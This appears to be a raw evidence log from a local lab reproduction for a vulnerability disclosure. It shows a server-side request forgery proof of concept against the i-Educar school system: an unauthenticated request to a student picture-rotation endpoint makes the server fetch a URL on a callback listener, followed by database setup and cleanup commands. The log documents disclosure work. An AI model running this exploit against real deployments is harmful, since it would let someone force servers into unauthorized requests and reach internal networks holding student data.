@@ -1,0 +1,42 @@
+# i-explorar raw evidence
+# started_at: 2026-09-11T00:17:21.396838+00:00
+# host: -03
+# target: http://127.0.0.1:8080
+# callback server listening on 0.0.0.0:41811
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T postgres psql -U ieducar -d ieducar -tAc SELECT ref_idpes FROM pmieducar.aluno WHERE cod_aluno = 3;
+
+--- psql output ---
+5
+--- end psql output ---
+# student 3 -> idpes 5
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T postgres psql -U ieducar -d ieducar -tAc INSERT INTO cadastro.fisica_foto (idpes, caminho) VALUES (5, 'http://example.invalid/i_explorar_poc06.jpg') ON CONFLICT (idpes) DO UPDATE SET caminho = EXCLUDED.caminho;
+
+--- psql output ---
+INSERT 0 1
+--- end psql output ---
+# POST /api/students/3/rotate-picture (no session, no token)
+# url=http://host.docker.internal:41811/ssrf-poc
+
+### callback server received
+method=GET path=/ssrf-poc
+header: Host: host.docker.internal:41811
+header: Connection: close
+header: Accept-language: en
+header: User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
+
+### rotate-picture response HTTP 200
+
+--- body ---
+{"url":"\/storage\/ieducar\/i_explorar_poc06.jpg"}
+--- end body ---
+$ docker compose exec -T php rm -f storage/app/public/ieducar/i_explorar_poc06.jpg
+
+--- cleanup output ---
+(empty)
+--- end cleanup output ---
+$ docker compose --project-directory /home/pollo/disclosures/i-explorar/lab/i-educar -f /home/pollo/disclosures/i-explorar/lab/i-educar/docker-compose.yml exec -T postgres psql -U ieducar -d ieducar -tAc DELETE FROM cadastro.fisica_foto WHERE idpes = 5;
+
+--- psql output ---
+DELETE 1
+--- end psql output ---
+# finished_at: 2026-09-11T00:17:22.453296+00:00
